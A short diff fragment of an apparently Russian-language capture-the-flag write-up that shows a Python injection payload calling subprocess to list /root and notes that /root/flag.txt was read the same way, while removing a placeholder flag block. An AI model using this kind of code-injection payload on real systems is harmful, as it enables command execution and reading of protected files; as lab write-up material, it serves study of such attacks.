@@ -83,6 +83,4 @@ int(__import__('subprocess').getoutput('ls -la /root 2>&1 | head -8'))
 
 Дальше тем же способом прочитал `/root/flag.txt` и получил флаг.
 
-```text
-[флаг]
-```
+
